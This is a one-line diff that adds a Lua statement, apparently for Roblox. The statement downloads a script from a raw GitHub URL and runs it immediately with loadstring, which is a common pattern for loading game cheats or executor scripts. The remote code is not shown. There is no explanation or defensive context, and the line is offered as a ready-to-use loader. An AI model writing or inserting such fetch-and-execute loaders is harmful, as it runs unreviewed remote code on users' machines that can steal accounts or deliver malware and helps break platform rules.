@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zateviss/9986/refs/heads/main/sc.lua"))()
